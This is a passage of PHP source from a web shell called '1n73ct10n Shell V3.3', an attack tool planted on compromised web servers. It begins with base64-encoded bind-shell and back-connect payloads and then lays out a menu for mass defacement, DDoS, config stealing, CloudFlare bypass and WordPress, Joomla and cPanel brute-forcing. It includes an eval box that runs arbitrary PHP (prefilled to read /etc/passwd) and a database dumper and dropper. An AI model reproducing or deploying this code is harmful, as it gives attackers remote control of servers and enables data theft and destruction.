HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W
tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL
ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6
uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf";
$port_bind_bd_pl="ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1
NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg
tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD
e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0
LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo
vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB
+hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=";
$back_connect="fZFRS8MwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St
ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j
S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ
ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw
Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==";
$back_connect_c="XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA
BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95
zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75
i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A
RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY
jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw==";
//config
?>
<html><head><link rel="SHORTCUT ICON" href="http://png-3.findicons.com/files/icons/1935/red_gems_vol_2/128/r2_dragon.png"><title>[ + ] 1n73ct10n Shell V3.3 [ + ]</title>
<script type="text/javascript">
function tukar(lama,baru){
	document.getElementById(lama).style.display = 'none';
	document.getElementById(baru).style.display = 'block';
}
</script><style type="text/css">
body { background-color:transparan;background:#000;background-image: url("https://fbcdn-sphotos-e-a.akamaihd.net/hphotos-ak-snc7/312433_115240901993648_1448557871_n.jpg");background-position: center;    background-attachment: fixed;background-repeat: no-repeat; } 
a {
text-decoration:none;
}
a:hover{
border-bottom:1px solid #00ff00; 
}
*{
	font-size:11px;
	font-family:Tahoma,Verdana,Arial;
	color:#00ff00;
}
#menu{
	background:#111111;
	margin:8px 2px 4px 2px;
}

#menu a{
	padding:4px 18px;
	margin:0;
	background:#222222;
	text-decoration:none;
	letter-spacing:2px;
	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
}
#menu a:hover{
	background:#191919;
	border-bottom:1px solid #333333;
	border-top:1px solid #333333;
}
.cyber173{ font-family:Vivaldi;font-size:50px;color: #00FF00;}
.tabnet{
	margin:15px auto 0 auto;
	border: 1px solid #333333;
}
.main {
	width:100%;
}
.gaya {
	color: #00ff00;
}
.inputz{
	background:#111111;
	border:0;
	padding:2px;
	border-bottom:1px solid #222222;
	border-top:1px solid #222222;
}
.inputzbut{
	background:#111111;
	color:#00ff00;
	margin:0 4px;
	border:1px solid #444444;

}
.inputz:hover, .inputzbut:hover{
	border-bottom:1px solid #00ff00;
	border-top:1px solid #00ff00;
}
.output {
	margin:auto;
	border:1px solid #00ff00;
	width:100%;
	height:400px;
	background:#000000;
	padding:0 2px;
}
.cmdbox{
	width:100%;
}
.head_info{
	padding: 0 4px;
}
.jaya{ font-family: ;}

.b374k{
	font-size:30px;
	padding:0;
	color:#444444;
}
.b374k_tbl{
	text-align:center;
	margin:0 4px 0 0;
	padding:0 4px 0 0;
	border-right:1px solid #333333;
}
.phpinfo table{
	width:100%;
	padding:0 0 0 0;
}
.phpinfo td{
	background:#111111;
	color:#cccccc;
padding:6px 8px;;
}
.phpinfo th, th{
	background:#191919;
	border-bottom:1px solid #333333;
font-weight:normal;
}
.phpinfo h2, .phpinfo h2 a{
	text-align:center;
	font-size:16px;
	padding:0;
	margin:30px 0 0 0;
	background:#222222;
	padding:4px 0;
}
.explore{
width:100%;
}
.explore a {
text-decoration:none;
}
.explore td{
border-bottom:1px solid #333333;
padding:0 8px;
line-height:24px;
}
.explore th{
padding:3px 8px;
font-weight:normal;
}
.explore th:hover , .phpinfo th:hover{
border-bottom:1px solid #00ff00;
}
.explore tr:hover{
background:#111111;
}
.viewfile{
background:#EDECEB;
color:#000000;
margin:4px 2px;
padding:8px;
}
.sembunyi{
display:none;
padding:0;margin:0;
}

</style></head>
<script language='javascript'>
if (document.all||document.getElementById){
var thetitle=document.title
document.title=''
}
var data="Us3 Y0ur br41n biTch ! ! !";
var done=1;
function statusIn(text){
decrypt(text,22,22);
}
function statusOut(){
self.status='';
done=1;
}
function decrypt(text, max, delay){
if (done){
done = 0;
rantit(text, max, delay, 0, max);
} 
}
function rantit(text, runs_left, delay, charvar, max){
if (!done){
runs_left = runs_left - 1;
var status = text.substring(0,charvar);
for(var current_char = charvar; current_char < text.length; current_char++){
status += data.charAt(Math.round(Math.random()*data.length));
}
document.title = status;
var rerun = "rantit('" + text + "'," + runs_left + "," + delay + "," + charvar + "," + max + ");"
var new_char = charvar + 1;
var next_char = "rantit('" + text + "'," + max + "," + delay + "," + new_char + "," + max + ");"
if(runs_left > 0){
setTimeout(rerun, delay);
}
else{
if (charvar < text.length){
setTimeout(next_char, Math.round(delay*(charvar+3)/(charvar+1)));
}
else
{
done = 1;
}
}
}
}
if (document.all||document.getElementById)
statusIn(thetitle)
</script>
<body onLoad="document.getElementById('cmd').focus();">
<div class="main">
<!-- head info start here -->
<div class="head_info">
<table ><tr>
<td><table class="b374k_tbl"><tr><td><a href="javascript:void(0)" onclick="location.reload();"><span class="b374k"><img src="http://www.fbvideo.16mb.com/files/1n73ction.png" /></span></a></td></tr><tr><td><b>1n73ction Shell V3.3 [ Special Edition ]</b></td></tr></table></td>
<td><?php echo $buff; ?></td>
</tr></table>
</div>
<!-- head info end here -->
<!-- menu start -->
<center><div id="menu">
<a href="?"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1gAADdYBkG95nAAAAAd0SU1FB9oJBxQ2GRnu/TgAAAJzSURBVDjLtZLPSxtBHMXf5semZDfS7KpIaWzRShoFD5UK9h6ai5eCPfZkwYJ4kF566a30H0gF24BUqDdjBT1VCFIsNBUWEw+ha2obpDGUXGR1Z7KZ+fbQRky1vfULAzPD4/MeMw/4H7O6ugoAsG17tFwuJwFgd3f3Qq3yN0g+n7+r6/oKgEtQMDWYGHx5kc539rC4uAgA2Hy/OaGq6oplWaVcLmdxxl9YlvUEALa2tv6dYGPjXSoS6chWKpWKaZpdoVBIL5VK+0NDQ/1END02NjZ/LsHc3BwAYG1tbSIYVLOFQuGzpmldgUDAkFKqvb2917a3t23GWDqXyz0BgPX19fYEy8vLKV3XswcHBxXDMLoikYghpaRW0kajwfbK5W834/F+ANOpVGr+FLC0tHRf0/TX+/tf7J6eniuappkA6IwBtSC2bX9NJBIDRPT05OTkuTL1aKpj9Pbox1qtdmgYxlXTNG8QEV3wPgRAcV23bllWfmRkZNh13VuKpmnBvr6+O1LK2szMzNtwOBxviYUQUBQFPp+vBYCU8jCTyaSOj48vA/hw6jI+Ph5JJpOfwuFwnIjAGKsvLCw8cxxHTE4+fGwY0RgRgYi+O44zPDs7W2/rgeu6CmMMjDFwziGE+JFIJF5Vq9VMs+kdcs7BOQdjDEdHR6fGgdZGCAHOOfx+P4gIQggZjUaps9OkRqNBjDHQr1E8z8M5QLVaheM4TZ/fBxDQbDZVz/MgJYFzHlRVFURQms2GqNfr4qIm+mOx2L3u7u5hKSVCIXVPSvGmsFNUBuLxB8FA4DoAeJ63UywWswBk2x+l0+kW0P97KX80tnXfNj8B5NE5DOMV2T0AAAAASUVORK5CYII=' height="18" width="34"></a>
<a href="?<?php echo "y=".$pwd; ?>">File</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=shell">Shell</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=php">Eval</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=sql">Mysql</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=dump">DB Dump</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo">Php Info</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit">NetSploit</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=upload">Upload</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mail">Mail</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=port-sc">Port Scan</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=jumping">Jumping</a><br><br>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=tool">Tools</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=dos">Ddos</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=symlink">Symlink</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=config">Multi Config Fucker</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=cgi">Multi Bypass Exploit</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=jodexer">Multi Index Changer</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mass">Mass Deface</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=zone">Zone-H</a><br><br>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mass_pass">Multi Reset password</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=wpbrute">Wordpress BruteForce</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=jbrute">Joomla BruteForce</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=brute">Cpanel BruteForce</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=hash">Hash</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=hashid">Hash ID</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=whois">Whois</a><br><br>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=bypass-cf">Bypass CloudFlare</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=string">Script Encode</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=jss">Joomla Server Scan</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=adfin">Admin Finder</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=tutor">Tutorial & Ebook</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=about">About</a>
<a href="?<?php echo "y=".$pwd;	?>&amp;x=logout">Log-Out</a>


</div></center>
<!-- menu end -->

<?php
@ini_set('display_errors', 0);
@ini_set('output_buffering',0);
if(isset($_GET['x']) && ($_GET['x'] == 'php')){ @ini_set('output_buffering',0); ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post">
<table class="cmdbox">
<tr><td>
<textarea class="output" name="cmd" id="cmd">
<?php
if(isset($_POST['submitcmd'])) {
	echo eval(magicboom($_POST['cmd']));
}
else echo "echo file_get_contents('/etc/passwd');";
?>
</textarea>
<tr><td><input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /></td></tr></form>
</table>
</form>

<?php } 

elseif(isset($_GET['x']) && ($_GET['x'] == 'sql')){
function view_size($size) {
  if (!is_numeric($size)) { return FALSE; }
  else {
if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
else {$size = $size . " B";}
return $size;
  }
}
function mysql_dump($set) {
  $sock = $set["sock"];
  $db = $set["db"];
  $print = $set["print"];
  $nl2br = $set["nl2br"];
  $file = $set["file"];
  $add_drop = $set["add_drop"];
  $tabs = $set["tabs"];
  $onlytabs = $set["onlytabs"];
  $ret = array();
  $ret["err"] = array();
  if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
  if (empty($db)) {$db = "db";}
  if (empty($print)) {$print = 0;}
  if (empty($nl2br)) {$nl2br = 0;}
  if (empty($add_drop)) {$add_drop = TRUE;}
  if (empty($file)) {
$file = $tmp_dir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";
  }
  if (!is_array($tabs)) {$tabs = array();}
  if (empty($add_drop)) {$add_drop = TRUE;}
  if (sizeof($tabs) == 0) {
$res = mysql_query("SHOW TABLES FROM ".$db, $sock);
if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
  }
  $out = "
  # Dumped By ".$xName."
  # MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
  # Date: ".date("d.m.Y H:i:s")."
  # DB: \"".$db."\"
  #---------------------------------------------------------";
  $c = count($onlytabs);
  foreach($tabs as $tab) {
if ((in_array($tab,$onlytabs)) or (!$c)) {
  if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}
  $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
  if (!$res) {$ret["err"][] = mysql_smarterror();}
  else {
$row = mysql_fetch_row($res);
$out .= $row["1"].";\n\n";
$res = mysql_query("SELECT * FROM `$tab`", $sock);
if (mysql_num_rows($res) > 0) {
  while ($row = mysql_fetch_assoc($res)) {
$keys = implode("`, `", array_keys($row));
$values = array_values($row);
foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
$values = implode("', '", $values);
$sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";
$out .= $sql;
  }
}
  }
}
  }
  $out .= "#---------------------------------------------------------------------------------\n\n";
  if ($file) {
$fp = fopen($file, "w");
if (!$fp) {$ret["err"][] = 2;}
else {
  fwrite ($fp, $out);
  fclose ($fp);
}
  }
  if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
  return $out;
}
function mysql_buildwhere($array,$sep=" and",$functs=array()) {
  if (!is_array($array)) {$array = array();}
  $result = "";
  foreach($array as $k=>$v) {
$value = "";
if (!empty($functs[$k])) {$value .= $functs[$k]."(";}
$value .= "'".addslashes($v)."'";
if (!empty($functs[$k])) {$value .= ")";}
$result .= "`".$k."` = ".$value.$sep;
  }
  $result = substr($result,0,strlen($result)-strlen($sep));
  return $result;
}
function mysql_fetch_all($query,$sock) {
  if ($sock) {$result = mysql_query($query,$sock);}
  else {$result = mysql_query($query);}
  $array = array();
  while ($row = mysql_fetch_array($result)) {$array[] = $row;}
  mysql_free_result($result);
  return $array;
}
function mysql_smarterror($sock) {
  if ($sock) { $error = mysql_error($sock); }
  else { $error = mysql_error(); }
  $error = htmlspecialchars($error);
  return $error;
}
function mysql_query_form() {
  global $submit,$sql_x,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
  if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
  if ($sql_query_result or (!$sql_confirm)) {$sql_x = $sql_goto;}
  if ((!$submit) or ($sql_x)) {
echo "<table><tr><td><form name=\"fx29sh_sqlquery\" method=POST><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=x value=sql><input type=hidden name=sql_x value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Yes\"> <input type=submit value=\"No\"></form></td>";
if ($tbl_struct) {
  echo "<td valign=\"top\"><b>Fields:</b><br>";
  foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "+ <a href=\"#\" onclick=\"document.fx29sh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
  echo "</td></tr></table>";
}
  }
  if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}
}
function mysql_create_db($db,$sock="") {
  $sql = "CREATE DATABASE `".addslashes($db)."`;";
  if ($sock) {return mysql_query($sql,$sock);}
  else {return mysql_query($sql);}
}
function mysql_query_parse($query) {
  $query = trim($query);
  $arr = explode (" ",$query);
  $types = array(
"SELECT"=>array(3,1),
"SHOW"=>array(2,1),
"DELETE"=>array(1),
"DROP"=>array(1)
  );
  $result = array();
  $op = strtoupper($arr[0]);
  if (is_array($types[$op])) {
$result["propertions"] = $types[$op];
$result["query"]  = $query;
if ($types[$op] == 2) {
  foreach($arr as $k=>$v) {
if (strtoupper($v) == "LIMIT") {
  $result["limit"] = $arr[$k+1];
  $result["limit"] = explode(",",$result["limit"]);
  if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}
  unset($arr[$k],$arr[$k+1]);
}
  }
}
  }
  else { return FALSE; }
}
function disp_error($msg) { echo "<div class=errmsg>$msg</div>\n"; }
function html_style() {
$style = ' <style type="text/css"> a { text-decoration:none; } a:hover { color: #00ff00; border-bottom:1px solid #00ff00; } input[type="text"], input[type="password"], select{ background:#111111; border:0; padding:2px; border:1px solid #444444; } input[type="submit"]{ background:#111111; color:#ffffff; margin:0 4px; border:1px solid #444444;} input[type="text"]:hover, input[type="submit"]:hover, input[type="password"]:hover, select:hover{ border-bottom:1px solid #00ff00;border-top:1px solid #00ff00;} .tab { width:100%; } th{ background:#191919; border-bottom:1px solid #333333; font-weight:normal; } .tub { width:100%; }  .tub th{ border-bottom:1px solid #00ff00; padding:3px;} .tub tr:hover{ background:#006400; } .tub td{ border-bottom:1px solid #333333; padding-left:3px; } #maininfo { padding:5px; margin-top:10px; margin-left:2px; margin-right:2px; background:#191919; } #maininfo a{ color:#00ff00; } textarea { background:#000000; border:1px solid #444444;} textarea:hover { border:1px solid #00ff00;} </style><center>';
return $style;
}
$auto_surl = TRUE;
foreach ($_REQUEST as $k => $v) {
  if (!isset($$k)) { $$k = $v; }
}
if ($auto_surl) {
  $include = "&";
  foreach (explode("&",getenv("QUERY_STRING")) as $v) {
$v= explode("=",$v);
$name= urldecode($v[0]);
$value= @urldecode($v[1]);
$needles = array("http://","https://","ssl://","ftp://","\\\\");
foreach ($needles as $needle) {
  if (strpos($value,$needle) === 0) {
$includestr .= urlencode($name)."=".urlencode($value)."&";
  } } } }
if (empty($surl)) { $surl = htmlspecialchars("?".@$includestr); }
if (!isset($x)) { $x = "sql"; }
  if ($x == "sql") {
  foreach (array("sort","sql_sort") as $v) {
if (!empty($_GET[$v])) { $$v = $_GET[$v]; }
if (!empty($_POST[$v])) { $$v = $_POST[$v]; }
  }
  if ($sort_save) {
if (!empty($sort)) { setcookie("sort",$sort); }
if (!empty($sql_sort)) { setcookie("sql_sort",$sql_sort); }
  }
  if (!isset($sort)) { $sort = $sort_default; }
  $sort = htmlspecialchars($sort);
  $sort[1] = strtolower($sort[1]);
  echo html_style();
echo "<div id='maininfo'>";
  if ($x == "sql") {
  $sql_surl = $surl."x=sql";
  if (!isset($sql_login)) { $sql_login = ""; }
  if (!isset($sql_passwd)) { $sql_passwd = ""; }
  if (!isset($sql_server)) { $sql_server = ""; }
  if (!isset($sql_port)) { $sql_port = ""; }
  if (!isset($sql_tbl)) { $sql_tbl = ""; }
  if (!isset($sql_x)) { $sql_x = ""; }
  if (!isset($sql_tbl_x)) { $sql_tbl_x = ""; }
  if (!isset($sql_order)) { $sql_order = ""; }
  if (!isset($sql_x)) { $sql_x = ""; }
  if (!isset($sql_getfile)) { $sql_getfile = ""; }
  if (@$sql_login)  { $sql_surl .= "&sql_login=".htmlspecialchars($sql_login); }
  if (@$sql_passwd) { $sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd); }
  if (@$sql_server) { $sql_surl .= "&sql_server=".htmlspecialchars($sql_server); }
  if (@$sql_port){ $sql_surl .= "&sql_port=".htmlspecialchars($sql_port); }
  if (@$sql_db) { $sql_surl .= "&sql_db=".htmlspecialchars($sql_db); }
  $sql_surl .= "&";
  echo "";
  if (@$sql_server) {
$sql_sock = @mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
$err = mysql_smarterror($sql_sock);
@mysql_select_db($sql_db,$sql_sock);
if (@$sql_query and $submit) {
  $sql_query_result = mysql_query($sql_query,$sql_sock);
  $sql_query_error = mysql_smarterror($sql_sock);
}
  }
  else { $sql_sock = FALSE; }
  if (!$sql_sock) {
if (!@$sql_server) { echo "<blink><b><font style= color:#ff0000>No Connection ! ! !</font></b></blink>"; }
else { disp_error("ERROR: ".$err); }
  }
  else {
#SQL Quicklaunch
$sqlquicklaunch= array();
$sqlquicklaunch[] = array("Index",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
$sqlquicklaunch[] = array("Query",$sql_surl."sql_x=query&sql_tbl=".urlencode($sql_tbl));
$sqlquicklaunch[] = array("Server status",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_x=serverstatus");
$sqlquicklaunch[] = array("Server variables",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_x=servervars");
$sqlquicklaunch[] = array("Processes",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_x=processes");
$sqlquicklaunch[] = array("Logout",$surl."x=sql");
echo "MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") Server: ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")<br>";
if (count($sqlquicklaunch) > 0) {
  foreach($sqlquicklaunch as $item) {
echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";
  }
  }
  }
echo "</div>";
echo "<center><table class='tab'><tr>";
  if (!$sql_sock) {
  echo  '<td>
<form name="f_sql" action="'.$surl.'x=sql" method="POST">
<input type="hidden" name="x" value="sql">
<table class="tabnet" style="padding:1px;">
<tr><th colspan="2">Mysql Manager</th></tr>
<tr><td>Host</td><td><input type="text" name="sql_server" class="inputz" style="width:249px;" value="localhost"></td></tr>
<tr><td>Username</td><td><input type="text" name="sql_login" class="inputz" value="" style="width:249px;"></td></tr>
<tr><td>Password</td><td><input type="password" name="sql_passwd" class="inputz" value="" style="width:249px;"></td></tr>
<tr><td>Database</td><td><input type="text" name="sql_db" value="" class="inputz" style="width:249px;"></td></tr>
<tr><td>Port</td><td><input type="text" name="sql_port"  class="inputz" value="3306" size="6"> <input type="submit" class="inputzbut" value="Connect"></td></tr>
</table>
</form>';
  }
  else {
  echo  '<td valign="top" style="border:1px solid #333333;">
<center>
<a href="'.$sql_surl.'"><b style="color:#00ff00;">HOME</b></a>
<hr size="1" noshade>';
  $result = mysql_list_dbs($sql_sock);
  if (!$result) { echo mysql_smarterror(); }
  else {
  echo  '<form action="'.$surl.'x=sql">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<select name="sql_db" onchange="this.form.submit()" style="width:100%;">';
$c = 0;
$dbs = "";
while ($row = mysql_fetch_row($result)) {
  $dbs .= "\t\t<option value=\"".$row[0]."\"";
  if (@$sql_db == $row[0]) { $dbs .= " selected"; }
  $dbs .= ">".$row[0]."</option>\n";
  $c++;
}
echo "\t\t<option value=\"\">Databases (".$c.")</option>\n";
echo $dbs;
  }
echo '</select>
<hr size="1" noshade>
</form>
</center>';
if (isset($sql_db)) {
  $result = mysql_list_tables($sql_db);
  if (!$result) { 
$result = mysql_list_dbs($sql_sock);
$num = mysql_num_rows($result);
for( $i = 0; $i < $num; $i++ ) {
$dbname = mysql_dbname( $result, $i );
echo "<table class='tab'><td style='background:#3F3F3F;border:1px solid #202020;border-top: 1px solid #505050;border-left: 1px solid #505050;'><b>+ <a href=\"".$sql_surl."sql_db=".$dbname."\">$dbname</a></b></td></table>"; } }
  else {
echo "\t<table class='tub'><th><a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a></th></table><br>\n";
$c = 0;
while ($row = mysql_fetch_array($result)) {
  $count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]);
  $count_row = mysql_fetch_array($count);
  echo "\t<b>+ <a style='color:#00ff00;' href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\">".htmlspecialchars($row[0])."</a></b> (".$count_row[0].")</br></b>\n";
  mysql_free_result($count);
  $c++;
}
if (!$c) { echo "No tables found in database"; }
  }
}
echo '</td>';
echo '<td style="border:1px solid #333333;">';
$diplay = TRUE;
if (@$sql_db) {
  if (!is_numeric($c)) { $c = 0; }
  if ($c == 0) { $c = "no"; }
  echo "\t<center><b>There are ".$c." table(s) in database: ".htmlspecialchars($sql_db)."";
  if (count(@$dbquicklaunch) > 0) {
foreach($dbsqlquicklaunch as $item) {
  echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";
}
  }
  echo "</b></center>\n";
  $xs = array("","dump");
  if ($sql_x == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
  elseif ($sql_x == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_x = "query";}
  elseif ($sql_x == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_x = "dump";}
  elseif ($sql_x == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
  elseif ($sql_x == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
  elseif ($sql_x == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
  elseif ($sql_x == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
  elseif ($sql_x == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,-1);} $sql_x = "query";}
  elseif ($sql_tbl_x == "insert") {
if ($sql_tbl_insert_radio == 1) {
  $keys = "";
  $akeys = array_keys($sql_tbl_insert);
  foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}
  if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}
  $values = "";
  $i = 0;
